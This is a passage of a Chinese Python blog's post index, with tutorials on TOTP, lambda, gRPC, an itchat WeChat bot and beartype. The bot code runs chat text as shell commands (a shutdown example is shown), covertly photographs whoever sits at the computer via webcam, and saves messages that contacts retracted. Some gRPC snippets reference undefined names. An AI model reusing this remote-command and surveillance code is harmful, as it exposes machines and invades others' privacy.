hashlib import sha256class TOTP:        def __init__(self, key, codeDigits):        self.key = key        self.codeDigits = codeDigits    def truncate(self, time):        time = time.rjust(16,&#x27;0&#x27;)        bigint = binascii.unhexlify(hex(int(&#x27;10&#x27;+time, 16))[2:])        msg = bigint[1:len(bigint)]        h = hmac.new(self.key, msg, sha256).digest()        offset = h[len(h)-1] &amp; 0xf        binary = (h[offset] &amp; 0x7f) &lt;&lt; 24        binary = binary | ((h[offset+1] &amp; 0xff)&lt;&lt;16)        binary = binary | ((h[offset+2] &amp; 0xff)&lt;&lt;8)        binary = binary | (h[offset+3] &amp; 0xff)        otp = binary % (10 ** self.codeDigits)        return str(otp).rjust(self.codeDigits, &#x27;0&#x27;)    def tc(self, ttl):        return format(int(int(time.time())/int(ttl)),&#x27;x&#x27;).upper()\n\n上面的代码就是我基于python3的实现（可以保存为totp.py），散列算法使用的是SHA-256，使用方式如下：\nimport totpimport base64secretKey = base64.b32encode(b&#x27;My secret key&#x27;)t = totp.TOTP(secretKey, 4)time = t.tc(60)    # 此处时间单位为秒result=t.truncate(time)print(result)\n","categories":["Python","安全"],"tags":["Python","安全","TOTP","谷歌身份验证器","HMAC","动态口令"]},{"title":"Python中lambda的使用，与它的三个好基友介绍！","url":"/posts/18713.html","content":"匿名函数lambda除了def语句，python还提供了一种生成函数对象的表达式形式。由于它与LISP语言中的一个工具类似，所以称为lambda。就像def一样，这个表达式创建了一个之后能够调用的函数，但是它返回一个函数而不是将这个函数赋值给一个变量。这些就是lambda叫做匿名函数的原因。实际上，他常常以一种行内进行函数定义的方式使用，或者用作推迟执行一些代码。lambda的一般形式是关键字lambda之后跟着一个或多个参数（与一个def头部内用括号括起来的参数列表类似），紧跟着是一个冒号，之后是表达式\n\nlambda arg1，arg2,argn:expression using arguments\n\n由lambda表达式所返回的函数对象与由def创建并复制后的函数对象工作起来是完全一致的，但lambda有一些不同之处，让其扮演特定的角色时更有用：\nlambda是一个表达式，而不是一个语句因为这一点，lambda可以出现在python语法不允许def出现的地方。此外，作为一个表达式，lambda返回一个值（一个新的函数），可以选择性的赋值给一个变量相反，def语句总是得在头部将一个新的函数赋值给一个变量，而不是将这个函数作为结果返回。\nlambda的主题是单个表达式，而不是一个代码块这个lambda的主题简单的就好像放在def主体return语句中的代码一样。简单的将结果写成一个顺畅的表达式，而不是明确的返回。但由于它仅限于表达式，故lambda通常要比def功能少…你仅能够在lambda主体中封装有限的逻辑进去，因为他是一个为编写简单函数而设计的。除了上述这些差别，def和lambda都能过做同样种类的工作\ndef与lambda的相同用法\nx = lambda x, y, z: x + y + zx(2, 3, 4)&gt;&gt;&gt; 9y = (lambda a=&#x27;hello&#x27;, b=&#x27;world&#x27;: a + b)y(b=&#x27;清风&#x27;)&gt;&gt;&gt; &#x27;hello清风&#x27;\n\n为什么使用lambda看过上面的两个小例子，很多人会说这个和def没什么差别，我们又为什么要使用lambda呢？通常来说，lambda起到一种函数的速写作用，允许在使用的代码内嵌一个函数的定义，他完全是可选的(是可以使用def代替他们)，但是在你仅需要切入一段可执行代码的情况下，它会带来一个更简洁的书写效果。\nlambda通常用来编写跳转表，也就是行为的列表或者字典，能够按照需求执行操作，比如：\nl = [lambda x: x ** 2, lambda x: x ** 3, lambda x: x ** 4]for f in l:    print(f(2))&gt;&gt;&gt; 4&gt;&gt;&gt; 8&gt;&gt;&gt; 16print(l[0](3))&gt;&gt;&gt; 9\n\n当需要把小段的可执行代码编写进def语句从语法上不能实现的地方是，lambda表达式作为def的一种速写来说，是最为有用的，如果上面的代码用def编写，则变为：\ndef f1(x):    return x ** 2def f2(x):    return x ** 3def f3(x):    return x ** 4l = [f1, f2, f3]for f in l:    print(f(2))print(l[0](3))\n\n实际上，我们可以用python中的字典或者其他的数据结构来构建更多种类的行为表，从而做同样的事情。\nlambda中实现if-elsePython中具备的单行表达式：**if a:b else c**语法在lambda中同样适用：\nlower = lambda x,y:x if x&lt;y else ylower(4,5)&gt;&gt;&gt; 4\n\n看了半天，大家可能也并未觉得lambda在python中到底比def优越与便利在哪里，那么说到lambda，就必须要提及三个函数**map、filter、reduce**，当你接触了这三个函数，那么你才能感受到lambda真实的方便之处\nmap 函数程序对列表或者其他序列常常要做的一件事就是对每个元素进行一个操作，并把其结果集合起来。python提供了一个工具map，它会对一个序列对象中的每一个元素应用该的函数，并返回一个包含了所有函数调用结果的列表。举个栗子，我们有一个列表，需要将列表的每一个字段+10，我们该如何操作？\nlist_show = [1, 2, 3, 4]# 方式1new_list_show = []for i in list_show:    new_list_show.append(i + 10)print(new_list_show)# 方式2def adds(x):    return x + 10print(list(map(adds, list_show)))# 更优雅的方式3：print(list(map(lambda x: x + 10, list_show)))\n\n看看上面三个实现方式，你觉得那种更加Pythonic？eg:需要注意一点，map在python3中是一个可迭代对象，引入需要使用列表调用来使它生成所有的结果用于显示，python2不必如此。当然map的阐述函数，不仅仅支持自己编写的，同样也支持python自带的多种函数，比如：\nlist_show = [1, -2, 3, -4, 5, -6]print(list(map(abs, list_show)))&gt;&gt;&gt; [1, 2, 3, 4, 5, 6]\n\n\n\nfilter函数filter通过字面意思，大家就知道它的用处了，用于数据的过滤操作，它也是lambda的一个好基友，举个栗子。我们需要过滤0-9中，能被2整除的数字组成一个列表，我们该如何操作？只需要一行代码：\nprint(list(filter(lambda x: x % 2 == 0, range(10))))&gt;&gt;&gt; [0, 2, 4, 6, 8]\n\n没错，filter就是这么的简单实用….\nreduce的妙用\nreduce在python2中是一个简单的函数，但在python3中它责备收录与functools中。它接收一个迭代器来处理并返回一个单个的结果。\n\nlist_show = [1, 2, 3, 4]print(reduce(lambda x, y: x + y, list_show))&gt;&gt;&gt; 10print(reduce(lambda x, y: x * y, list_show))&gt;&gt;&gt; 24\n\n","categories":["Python"],"tags":["Python","lambda","map","filter","reduce","函数式编程"]},{"title":"Python使用ETCD3","url":"/posts/19522.html","content":"","categories":["Python","分布式"],"tags":["Python","etcd","etcd3","分布式","服务发现"]},{"title":"Python使用gRPC协议通信","url":"/posts/51030.html","content":"简单介绍gRPC是谷歌开源的通信协议，支持多开发语言，可以实现跨语言调用，函数调用的形式非常直观，需要编写Protobuf 文件，生成对应开发语言的模块文件。Protobuf 数据序列化传输是二进制协议传输，相对json、xml等格式要更加轻量。是目前微服务最流行使用的协议。\ngRPC官网\n安装pip install grpcio #安装grpcpip install grpcio-tools #安装grpc tools\n\ngRPC模式gRPC提供了四种服务模式：\n\n一元 RPC，其中客户端向服务端发送单个请求并获得 单响应返回，就像正常的函数调用一样。\nrpc SayHello(HelloRequest) returns (HelloResponse);\n服务端流式 RPC，其中客户端向服务端发送请求，并获得一个流来读取一系列消息。客户端从返回的流中读取，直到没有更多消息为止。gRPC 保证在单个 RPC 调用中进行消息排序。\nrpc LotsOfReplies(HelloRequest) returns (stream HelloResponse);\n客户端流式 RPC，其中客户端写入一系列消息并将其发送到服务端，同样使用提供的流。一旦客户端完成了消息的写入，它将等待服务端读取它们并返回其响应。同样，gRPC 保证单个 RPC 调用中的消息顺序。\nrpc LotsOfGreetings(stream HelloRequest) returns (HelloResponse);\n双向流式 RPC，其中双方使用读写流发送一系列消息。这两个流是独立运行的，因此客户端和服务端可以按照他们喜欢的顺序读写: 例如，服务端可以在写响应之前等待接收所有客户端消息，或者它可以交替读消息然后写消息，或者其他读写组合。保留了每个流中消息的顺序\nrpc BidiHello(stream HelloRequest) returns (stream HelloResponse);\n\nProtobuf文件格式\n\n\n常见关键字\n解释\n\n\n\nsyntax\n指定protobuf版本\n\n\npackage\n包名，可以不填\n\n\nimport\n导入一些插件，一般go用的比较多\n\n\nmessage\n定义传输的数据结构\n\n\nservice\n定义服务\n\n\nrpc\n定义服务中的方法\n\n\nstream\n定义方法中数据的传输方式为流传输\n\n\n\n\n\n常见数据类型\n解释\n\n\n\nstring\n默认值为空白字符， 字符串必须始终包含UTF-8编码或7位ASCII文本。\n\n\nint32/int64\n对应长短整型，默认值是0\n\n\nbool\nbool类型\n\n\nfloat\n浮点型\n\n\nrepeated\n对应于python列表类型，但不完全一样，数据类型只能为一种，不能动态变换\n\n\nmap\n对应于python字典类型，但不完全一样，数据类型只能为一种，不能动态变换\n\n\nbytes\n比特类型，默认值是空白字节，可能包含任何字节序列\n\n\n一元模式编写Protobuf文件首先定义Protobuf文件，通常以.proto文件名结尾。如下example.proto\nsyntax = &quot;proto3&quot;;   // protobuf版本package example;   // 此文件的标识符,不添加也可以,以防止协议消息类型之间的名称冲突// 定义请求消息结构message request &#123;\tint32 age = 1;\tstring name = 2;&#125;// 定义响应消息结构，字段编号不能相同，无特别意义message response &#123;\tstring message = 1;&#125;//定义服务，一元模式协议，类似普通的HTTP请求，客户端发起请求，服务端返回结果，即完成一次通信service UserInfo &#123;\trpc Info (request) returns (response) &#123;&#125;&#125;\n\n编写完Protobuf文件，需要使用grpc-tools生成对应的python代码，生成的代码供客户端和服务端调用。\npython -m grpc_tools.protoc -I./protos/ --python_out=. --pyi_out=. --grpc_python_out=. example.proto  python_out：指定xxx_pb2.py的输出路径，编译生成处理protobuf相关的代码路径。传入.，则生成到当前目录。grpc_python_out：指定xxx_pb2_grpc.py的输出路径，编译生成处理grpc相关的代码路径，传入.，则生成到当前目录。grpc_tools.protoc：工具包，由安装的grpc-tools提供。-I：指定Protobuf协议文件的查找目录。\n\n服务端gRPC常用于异步编程中，这里介绍异步和同步版本的调用分别如何使用。缩进代码预留，这里去除掉了导入Protobuf文件生成的模块。\n\n异步\nclass Greeter(example_pb2_grpc.UserInfoServicer):    async def Info(self, request, context):        return example_pb2.Info(message=&#x27;Hello, %s!&#x27; % request.name)async def serve(port) -&gt; None:    # port = &#x27;50051&#x27;    server = grpc.aio.server()    example_pb2_grpc.add_UserInfoServicer_to_server(UserInfo(), server)    listen_addr = &#x27;[::]:&#x27; + str(port)    server.add_insecure_port(listen_addr)    logging.info(&quot;Starting server on %s&quot;, listen_addr)    await server.start()    await server.wait_for_termination()    if __name__ == &#x27;__main__&#x27;:    logging.basicConfig(level=logging.INFO)    asyncio.run(serve(50051))\n同步\nclass Greeter(example_pb2_grpc.UserInfoServicer):    def Info(self, request, context):        return example_pb2.Info(message=&#x27;Hello, %s!&#x27; % request.name)def serve():    port = &#x27;50051&#x27;    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))    example_pb2_grpc.add_UserInfoServicer_to_server(UserInfo(), server)    server.add_insecure_port(&#x27;[::]:&#x27; + port)    server.start()    print(&quot;Server started, listening on &quot; + port)    server.wait_for_termination()if __name__ == &#x27;__main__&#x27;:    logging.basicConfig()    serve()\n\n客户端\n异步\nasync def run() -&gt; None:    async with grpc.aio.insecure_channel(&#x27;localhost:50051&#x27;) as channel:        stub = example_pb2_grpc.UserInfoStub(channel)        response: example_pb2.response = await stub.Info(example_pb2.request(            age=18,            name=&quot;daoji&quot;        ))    print(&quot;Greeter client received: &quot; + response.message)    if __name__ == &#x27;__main__&#x27;:    logging.basicConfig()    asyncio.run(run())\n同步\ndef run():    # NOTE(gRPC Python Team): .close() is possible on a channel and should be    # used in circumstances in which the with statement does not fit the needs    # of the code.    print(&quot;Will try to greet world ...&quot;)    with grpc.insecure_channel(&#x27;localhost:50051&#x27;) as channel:        stub = example_pb2_grpc.UserInfoStub(channel)        response = stub.Info(example_pb2.request(name=&#x27;you&#x27;))    print(&quot;Greeter client received: &quot; + response.message)if __name__ == &#x27;__main__&#x27;:    logging.basicConfig()    run()\n\n服务端流式Protobuf文件// .protosyntax = &quot;proto3&quot;;package example;message request &#123;\tstring message = 1;&#125;message response &#123;\tstring message = 1;&#125;//定义服务，下面定义的这种为最简单的rpc服务，客户端发起请求，服务端返回结果,stream关键字用来定义流式传输service StreamTest &#123;\trpc ClientStream (stream request) returns (response) &#123;&#125;&#125;\n\n服务端class StreamTest(example_pb2_grpc.StreamTestServicer):    async def ClientStream(self, request_iterator: AsyncIterable[example_pb2.request],                           context: grpc.aio.ServicerContext) -&gt; example_pb2.response:        async for i in request_iterator:            print(i.message)            if i.message == &#x27;close&#x27;:                return example_pb2.response(message=&#x27;close!😢&#x27;)        return example_pb2.response(message=&#x27;ok!🐧&#x27;)async def serve() -&gt; None:    port = &#x27;50051&#x27;    server = grpc.aio.server()    example_pb2_grpc.add_StreamTestServicer_to_server(StreamTest(), server)    listen_addr = &#x27;[::]:&#x27; + str(port)    server.add_insecure_port(listen_addr)    logging.info(&quot;Starting server on %s&quot;, listen_addr)    await server.start()    await server.wait_for_termination()if __name__ == &#x27;__main__&#x27;:    logging.basicConfig()    asyncio.run(serve())\n\n客户端async def client_stram(stub: example_pb2_grpc.StreamTestStub) -&gt; None:    route_iterator = [example_pb2.request(message=&#x27;close&#x27;)]    # gRPC AsyncIO client-streaming RPC API accepts both synchronous iterables    # and async iterables.    route_summary = await stub.ClientStream(route_iterator)async def main() -&gt; None:    async with grpc.aio.insecure_channel(&#x27;localhost:50051&#x27;) as channel:        stub = example_pb2_grpc.StreamTestStub(channel)        print(&quot;-------------- RecordRoute --------------&quot;)        await client_stram(stub)        if __name__ == &#x27;__main__&#x27;:    logging.basicConfig(level=logging.INFO)    asyncio.get_event_loop().run_until_complete(main())\n\n客户端流式双向流式","categories":["Python","网络编程"],"tags":["Python","gRPC","Protobuf","微服务","RPC"]},{"title":"Python实现可扩展微信机器人和黑科技","url":"/posts/56855.html","content":"\n\n\n介绍&emsp;&emsp;为了方便和效率，这里我使用了一个在开源社区比较流行的框架itchat，缺少的库请自行安装，我的开发环境比较乱，就不导出requirement.txt了。我也有自己分析的一套登陆以及消息轮询的代码，但是我是懒癌晚期，不想维护和提供长期服务什么的。这里使用开源框架做示例也比较方便你自己去查文档。\n&emsp;&emsp;我也看到网上很多人有很多种有趣的玩法，一些不是玩网一族的人看不出来这个能实现什么功能。它就像微信给的小程序一样，微信提供的只是接口，各种功能都是开发者想出来，我几年前做QQ机器人，也是用web端协议，当时集成的有一言接口，图灵接口，日历接口，文字游戏接口，图片回复接口，猜谜等第三方接口，还实现了后台牛牛系统(赌博系统)，信息管理系统，定时通知功能等。所以说如果不去开发它，就没什么意义了。\n示例代码解析# coding=utf-8import reimport tracebackimport itchat, os, time, cv2from itchat.content import *# 说明：可以撤回的有文本文字、语音、视频、图片、位置、名片、分享、附件# &#123;msg_id:(msg_from,msg_to,msg_time,msg_time_rec,msg_type,msg_content,msg_share_url)&#125;msg_dict = &#123;&#125;# 文件存储临时目录rev_tmp_dir = r&#x27;C:\\Users\\Administrator\\Desktop\\ARMProjects\\WeChat\\\\&#x27;if not os.path.exists(rev_tmp_dir): os.mkdir(rev_tmp_dir)# 表情有一个问题 | 接受信息和接受note的msg_id不一致 巧合解决方案face_bug = NonesendMsg = u&quot;&#123;消息助手&#125;：微信助手开启，主人正在休息，稍后回复。&quot;usageMsg = u&quot;使用方法：\\n1.运行CMD命令：cmd xxx (xxx为命令)\\n&quot; \\           u&quot;-例如关机命令:\\ncmd shutdown -s -t 0 \\n&quot; \\           u&quot;2.获取当前电脑用户：cap\\n3.启用消息助手(默认关闭)：ast\\n&quot; \\           u&quot;4.关闭消息助手：astc&quot;flag = 0  # 消息助手开关filename = &quot;&#123;&#125;.txt&quot;.format(time.strftime(&#x27;%Y-%m-%d&#x27;, time.localtime(time.time())))def log(text):    with open(filename, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as f:        f.seek(0)        f.write(&#x27;-&#x27; * 20 + &#x27;\\n&#x27;)        f.write(text + &#x27;\\n&#x27;)        f.write(&#x27;-&#x27; * 20 + &#x27;\\n&#x27;)@itchat.msg_register(&#x27;Text&#x27;, isGroupChat=False)def text_reply(msg):    global flag    global face_bug    message = msg[&#x27;Text&#x27;]    fromName = msg[&#x27;FromUserName&#x27;]    toName = msg[&#x27;ToUserName&#x27;]    msg_from = (itchat.search_friends(userName=msg[&#x27;FromUserName&#x27;]))[&quot;NickName&quot;]    # 获取的是本地时间戳并格式化本地时间戳 e: 2017-04-21 21:30:08    msg_time_rec = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime(time.time()))    # 消息ID    msg_id = msg[&#x27;MsgId&#x27;]    # 消息时间    msg_time = msg[&#x27;CreateTime&#x27;]    # 消息发送人昵称 | 这里也可以使用RemarkName备注　但是自己或者没有备注的人为None    msg_from = (itchat.search_friends(userName=msg[&#x27;FromUserName&#x27;]))[&quot;NickName&quot;]    # 消息内容    msg_content = msg[&#x27;Text&#x27;]    # 分享的链接    msg_share_url = None    face_bug = msg_content    # 更新字典    msg_dict.update(        &#123;            msg_id: &#123;                &quot;msg_from&quot;: msg_from, &quot;msg_time&quot;: msg_time, &quot;msg_time_rec&quot;: msg_time_rec,                &quot;msg_type&quot;: msg[&quot;Type&quot;],                &quot;msg_content&quot;: msg_content, &quot;msg_share_url&quot;: msg_share_url            &#125;        &#125;    )    if &#x27;昌哥&#x27; in msg[&#x27;Text&#x27;] or &#x27;阿昌&#x27; in msg[&#x27;Text&#x27;] or &#x27;DAOJI&#x27; in msg[&#x27;Text&#x27;].upper():        try:            msg.user.send_image(&#x27;./190427-130223.png&#x27;)            # itchat.send_image(&#x27;./190427-130223.png&#x27;, toName)        except:            traceback.print_exc()    if toName == &quot;filehelper&quot;:        if message == &quot;cap&quot;:            cap = cv2.VideoCapture(0)            ret, img = cap.read()            cv2.imwrite(&quot;weixinTemp.jpg&quot;, img)            itchat.send(&#x27;@img@%s&#x27; % u&#x27;weixinTemp.jpg&#x27;, &#x27;filehelper&#x27;)            cap.release()        if message[0:3] == &quot;cmd&quot;:            os.system(message.strip(message[0:4]))        if message == &quot;ast&quot;:            flag = 1            itchat.send(&quot;消息助手已开启&quot;, &quot;filehelper&quot;)        if message == &quot;astc&quot;:            flag = 0            itchat.send(&quot;消息助手已关闭&quot;, &quot;filehelper&quot;)    elif flag == 1:        itchat.send(sendMsg, fromName)        log(&#x27;&#123;0&#125;    &#123;1&#125;:\\n\\n&#123;2&#125;&#x27;.format(msg_time_rec, msg_from, message))# TODO(Daoji) 2019/4/27 群聊艾特@itchat.msg_register(TEXT, isGroupChat=True)def text_reply(msg):    if msg.isAt:        msg.user.send(u&#x27;@%s\\u2005I received: %s&#x27; % (            msg.actualNickName, msg.text))# 将接收到的消息存放在字典中，当接收到新消息时对字典中超时的消息进行清理 | 不接受不具有撤回功能的信息# [TEXT, PICTURE, MAP, CARD, SHARING, RECORDING, ATTACHMENT, VIDEO, FRIENDS, NOTE]@itchat.msg_register([PICTURE, MAP, CARD, SHARING, RECORDING, ATTACHMENT, VIDEO])def handler_receive_msg(msg):    global face_bug    # 获取的是本地时间戳并格式化本地时间戳 e: 2017-04-21 21:30:08    msg_time_rec = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())    # 消息ID    msg_id = msg[&#x27;MsgId&#x27;]    # 消息时间    msg_time = msg[&#x27;CreateTime&#x27;]    # 消息发送人昵称 | 这里也可以使用RemarkName备注　但是自己或者没有备注的人为None    msg_from = (itchat.search_friends(userName=msg[&#x27;FromUserName&#x27;]))[&quot;NickName&quot;]    # 消息内容    msg_content = None    # 分享的链接    msg_share_url = None    &#x27;&#x27;&#x27;            接收视频和图片和文件，自动保存以及回发    &#x27;&#x27;&#x27;    # msg.download(msg.fileName)    # typeSymbol = &#123;    #     PICTURE: &#x27;img&#x27;,    #     VIDEO: &#x27;vid&#x27;, &#125;.get(msg.type, &#x27;fil&#x27;)    # return &#x27;@%s@%s&#x27; % (typeSymbol, msg.fileName)    if msg[&#x27;Type&#x27;] == &#x27;Text&#x27; \\            or msg[&#x27;Type&#x27;] == &#x27;Friends&#x27;:        msg_content = msg[&#x27;Text&#x27;]    elif msg[&#x27;Type&#x27;] == &#x27;Recording&#x27; \\            or msg[&#x27;Type&#x27;] == &#x27;Attachment&#x27; \\            or msg[&#x27;Type&#x27;] == &#x27;Video&#x27; \\            or msg[&#x27;Type&#x27;] == &#x27;Picture&#x27;:        msg_content = r&quot;&quot; + msg[&#x27;FileName&#x27;]        # 保存文件        msg[&#x27;Text&#x27;](rev_tmp_dir + msg[&#x27;FileName&#x27;])    elif msg[&#x27;Type&#x27;] == &#x27;Card&#x27;:        msg_content = msg[&#x27;RecommendInfo&#x27;][&#x27;NickName&#x27;] + r&quot; 的名片&quot;    elif msg[&#x27;Type&#x27;] == &#x27;Map&#x27;:        x, y, location = re.search(            &quot;&lt;location x=\\&quot;(.*?)\\&quot; y=\\&quot;(.*?)\\&quot;.*label=\\&quot;(.*?)\\&quot;.*&quot;, msg[&#x27;OriContent&#x27;]).group(1, 2, 3)        if location is None:            msg_content = r&quot;纬度-&gt;&quot; + x.__str__() + &quot; 经度-&gt;&quot; + y.__str__()        else:            msg_content = r&quot;&quot; + location    elif msg[&#x27;Type&#x27;] == &#x27;Sharing&#x27;:        msg_content = msg[&#x27;Text&#x27;]        msg_share_url = msg[&#x27;Url&#x27;]    face_bug = msg_content    # 更新字典    msg_dict.update(        &#123;            msg_id: &#123;                &quot;msg_from&quot;: msg_from, &quot;msg_time&quot;: msg_time, &quot;msg_time_rec&quot;: msg_time_rec,                &quot;msg_type&quot;: msg[&quot;Type&quot;],                &quot;msg_content&quot;: msg_content, &quot;msg_share_url&quot;: msg_share_url            &#125;        &#125;    )# 收到note通知类消息，判断是不是撤回并进行相应操作@itchat.msg_register([NOTE])def send_msg_helper(msg):    global face_bug    if re.search(r&quot;&lt;!\\[CDATA\\[.*撤回了一条消息\\]\\]&gt;&quot;, msg[&#x27;Content&#x27;]) is not None:        # 获取消息的id        old_msg_id = re.search(r&quot;&lt;msgid&gt;(.*?)&lt;/msgid&gt;&quot;, msg[&#x27;Content&#x27;]).group(1)        old_msg = msg_dict.get(old_msg_id, &#123;&#125;)        if len(old_msg_id) &lt; 11:            itchat.send_file(rev_tmp_dir + face_bug, toUserName=&#x27;filehelper&#x27;)            os.remove(rev_tmp_dir + face_bug)        else:            msg_body = &quot;告诉你一个秘密~&quot; + &quot;\\n&quot; \\                       + old_msg.get(&#x27;msg_from&#x27;) + &quot; 撤回了 &quot; + old_msg.get(&quot;msg_type&quot;) + &quot; 消息&quot; + &quot;\\n&quot; \\                       + old_msg.get(&#x27;msg_time_rec&#x27;) + &quot;\\n&quot; \\                       + &quot;撤回了什么 ⇣&quot; + &quot;\\n&quot; \\                       + r&quot;&quot; + old_msg.get(&#x27;msg_content&#x27;)            # 如果是分享存在链接            if old_msg[&#x27;msg_type&#x27;] == &quot;Sharing&quot;: msg_body += &quot;\\n就是这个链接➣ &quot; + old_msg.get(&#x27;msg_share_url&#x27;)            # 将撤回消息发送到文件助手            itchat.send(msg_body, toUserName=&#x27;filehelper&#x27;)            # 有文件的话也要将文件发送回去            if old_msg[&quot;msg_type&quot;] == &quot;Picture&quot; \\                    or old_msg[&quot;msg_type&quot;] == &quot;Recording&quot; \\                    or old_msg[&quot;msg_type&quot;] == &quot;Video&quot; \\                    or old_msg[&quot;msg_type&quot;] == &quot;Attachment&quot;:                file = &#x27;@fil@%s&#x27; % (rev_tmp_dir + old_msg[&#x27;msg_content&#x27;])                itchat.send(msg=file, toUserName=&#x27;filehelper&#x27;)                os.remove(rev_tmp_dir + old_msg[&#x27;msg_content&#x27;])            # 删除字典旧消息            msg_dict.pop(old_msg_id)@itchat.msg_register(FRIENDS)def add_friend(msg):    msg.user.verify()    msg.user.send(&#x27;机器人启动，自动同意好友添加。&#x27;)if __name__ == &#x27;__main__&#x27;:    itchat.auto_login(hotReload=True, enableCmdQR=False)    itchat.send(usageMsg, &quot;filehelper&quot;)    itchat.run()\n\n&emsp;&emsp;@itchat.msg_register(&#39;Text&#39;, isGroupChat=False)这个是框架的语法，可以查文档，这个语法糖是绑定一个函数监听Text即文本消息，isGroupChat=False判断是不是群聊。这里不能重复绑定函数，不然有一个会失效。@itchat.msg_register([PICTURE, MAP, CARD, SHARING, RECORDING, ATTACHMENT, VIDEO]) @itchat.msg_register(FRIENDS) @itchat.msg_register([NOTE])这个也是，写法不同，参照官方源码示例，好像文档没给出，但是影响、意义不大。\nmessage = msg[&#x27;Text&#x27;]   fromName = msg[&#x27;FromUserName&#x27;]   toName = msg[&#x27;ToUserName&#x27;]   msg_from = (itchat.search_friends(userName=msg[&#x27;FromUserName&#x27;]))[&quot;NickName&quot;]\n\n\n\n&emsp;&emsp;这里是绑定的函数接收一个msg形参，是一个字典，可以取出你接收到的一条消息里面包含的所有内容，有消息文本，发送者的微信ID，接受者的微信ID，以及发送者的昵称，还有更多的信息，要开发的话要去查官方资料了解一下，这里昵称通过框架的另外一个查找api查询微信ID对应的用户昵称。\nif toName == &quot;filehelper&quot;:    if message == &quot;cap&quot;:        cap = cv2.VideoCapture(0)        ret, img = cap.read()        cv2.imwrite(&quot;weixinTemp.jpg&quot;, img)        itchat.send(&#x27;@img@%s&#x27; % u&#x27;weixinTemp.jpg&#x27;, &#x27;filehelper&#x27;)        cap.release()    if message[0:3] == &quot;cmd&quot;:        os.system(message.strip(message[0:4]))    if message == &quot;ast&quot;:        flag = 1        itchat.send(&quot;消息助手已开启&quot;, &quot;filehelper&quot;)    if message == &quot;astc&quot;:        flag = 0        itchat.send(&quot;消息助手已关闭&quot;, &quot;filehelper&quot;)elif flag == 1:    itchat.send(sendMsg, fromName)    log(&#x27;&#123;0&#125;    &#123;1&#125;:\\n\\n&#123;2&#125;&#x27;.format(msg_time_rec, msg_from, message))\n\n&emsp;&emsp;我这里判断消息来自微信的文件传输助手，就进行逻辑操作，这里也调用了OpenCV进行拍照，可以远程传输到手机上，监控当前电脑前的用户相貌，还有cmd远程执行Power Shell命令，还有自动回复开关。\n总结&emsp;&emsp;还有群聊艾特取消息自动回复，消息防撤回，一些已注释的是不同的API写法，和我平时不使用的功能，这里我只是进行笼统的讲解和给出参考代码，因为也没有时间进行大篇幅的讲解，和讲述一些基础知识。有问题的通过我的网盘链接加群吧，基础知识会有人帮我讲解，他们解决不了的我会讲，代码就贴下面了，安装完模块就能进行测试了。\n源码if __name__ == &#x27;__main__&#x27;:    itchat.auto_login(hotReload=True, enableCmdQR=False)    itchat.send(usageMsg, &quot;filehelper&quot;)    itchat.run()\n\nLinux端使用要把enableCmdQR=False改成True，基本用linux也不要我多说了，试试就知道。\n地址：源码\n","categories":["Python","自动化"],"tags":["Python","微信机器人","itchat","自动化","OpenCV"]},{"title":"Python获取系统类型","url":"/posts/32717.html","content":"通过platform模块可以获取系统信息# 判定系统is_sys = platform.system()if is_sys == &quot;Darwin&quot;:\tpasselif is_sys == &quot;Linux&quot;:\tpasselse:\tNone\n","categories":["Python"],"tags":["Python","platform","操作系统","系统信息"]},{"title":"beartype 运行时入参校验","url":"/posts/35873.html","content":"beartype 和 pydantic 都是 Python 中用于类型检查和数据验证的工具，但它们的设计理念和应用场景有所不同。我们来详细对比一下它们的区别，以便你根据需求选择合适的工具。\n\n🔍 beartype vs pydantic\n\n\n特性\nbeartype\npydantic\n\n\n\n类型检查时机\n运行时类型检查\n运行时类型验证 + 数据模型构建\n\n\n使用场景\n函数、方法、类的类型检查\n数据模型验证、序列化/反序列化\n\n\n自动装饰\nbeartype_this_package 自动装饰\n不支持自动装饰，每个模型需要手动定义\n\n\n性能\n高效、轻量，函数级别检查\n性能较高，但因为有数据模型构建和验证，开销更大\n\n\n错误提示\n详细的参数和返回值错误提示\n报错信息详细，支持字段级别的错误提示\n\n\n复杂类型支持\n对复杂类型支持有限\n完全支持 Union、List、Dict、嵌套模型等复杂类型\n\n\n静态代码支持\n兼容 Python 原生类型提示（PEP 484）\n使用自定义类型提示，与 MyPy 兼容\n\n\n数据转换\n无数据转换功能\n自动数据转换（如 str 转 int，datetime 等）\n\n\n\n🎯 功能对比分析\n\n\n特性\nbeartype 示例\npydantic 示例\n\n\n\n函数类型检查\n✅ 自动装饰 @beartype_this_package\n❌ 不支持函数类型装饰\n\n\n数据模型验证\n❌ 不支持（只能用于参数和返回值检查）\n✅ 强大的数据模型验证和序列化\n\n\n数据解析与转换\n❌ 不支持\n✅ 自动数据转换，如字符串转数字、日期\n\n\n默认值和校验\n❌ 仅支持 Python 默认参数\n✅ 支持默认值、校验器（@validator 装饰器）\n\n\n数据序列化/反序列化\n❌ 无内置序列化和反序列化功能\n✅ 支持 .json()、.dict() 等序列化\n\n\n\n💡 代码示例对比1. 使用 beartype 进行函数类型检查from beartype import beartype@beartypedef add(x: int, y: int) -&gt; int:    return x + yprint(add(1, 2))      # 正常输出 3print(add(1, &quot;2&quot;))    # 运行时报错，类型不匹配\n\n优点：轻量、简单、零配置 缺点：仅用于类型检查，无法数据转换或序列化\n\n2. 使用 pydantic 进行数据模型验证和转换from pydantic import BaseModel, ValidationErrorclass User(BaseModel):    id: int    name: str    age: int = 18  # 默认值try:    user = User(id=&quot;123&quot;, name=&quot;Alice&quot;)    print(user)except ValidationError as e:    print(e)\n\n输出：\nid=123 name=&#x27;Alice&#x27; age=18\n\n优点：\n\n强大的数据转换和默认值支持\n结构化数据验证\n\n缺点：\n\n需要手动定义数据模型\n运行时有性能开销\n\n\n🔧 适用场景建议\n\n\n使用场景\n适合工具\n说明\n\n\n\n轻量级的函数参数和返回值类型检查\nbeartype\n高效、简洁、轻量，适合快速类型检查\n\n\n复杂的业务数据模型验证和序列化\npydantic\n复杂数据验证、转换、序列化的最佳选择，支持 FastAPI 等框架\n\n\n快速调试、原型开发\nbeartype\n不需要复杂的数据模型，只需检查类型一致性\n\n\n严格的输入校验和数据转换需求\npydantic\n需要严格的类型转换、字段验证和数据解析\n\n\n\n🔥 总结\n如果你的目标是快速、轻量的 运行时类型检查，**beartype** 是首选。可以轻松扩展到整个项目而不需要重构代码。\n如果你需要 数据模型的验证、转换、序列化，或者正在使用 FastAPI 等框架，**pydantic** 